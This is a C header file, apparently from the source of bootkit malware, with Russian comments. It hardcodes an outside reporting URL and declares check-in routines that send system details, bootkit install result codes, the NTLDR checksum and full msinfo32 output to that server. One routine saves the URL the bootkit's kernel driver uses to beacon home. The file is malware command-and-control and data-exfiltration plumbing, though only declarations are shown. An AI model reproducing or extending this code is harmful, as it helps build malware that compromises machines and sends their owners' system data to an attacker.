#ifndef DbgRptH
#define DbgRptH

//rta	jutbQuxicu
#define PP_REPORT_URL  "http://mmg-studios.org/geter/index.php"

//#define DBGRPT_ENABLED

#ifdef DBGRPT_ENABLED
#	define PP_DBGRPT_FUNCTION_CALL(function) { (function); };
#else 
#	define PP_DBGRPT_FUNCTION_CALL(function) __noop
#endif

// Ф-ция инициализации отправки сообщений
void DebugReportInit();

// Отстук с информацией о системе (будет заменяться контрольными точками в будущем)
void DebugReportSystem();

// Отстук с информацией о коде установки
void DebugReportBkInstallCode(DWORD BkInstallResult);

// Отстук по именной контрольной точке
void DebugReportStepByName(const char* StepName);

void DebugReportStep1();
void DebugReportStep2(DWORD BkInstallResult);

// Отстук с информацией о MD5 файла NTLDR
void DebugReportUpdateNtldrCheckSum();

// Отправка полной системной информации (результат работы msinfo32.exe)
void DebugReportCreateConfigReportAndSend();

// Сохранение URL, который будет использовать драйвер буткита для отстука из ядра
bool DebugReportSaveUrlForBootkitDriver();

// Сохранение параметров для команд, которые устанавливают параметры статистического отстука
void DebugReportSaveSettings(const char* ParamsList);

// Запуск тестов для просмотра отладочного вывода
void DebugReportRunTests();

char* CalcNtldrMd5(char* Buffer, DWORD BufferSize);

#endif 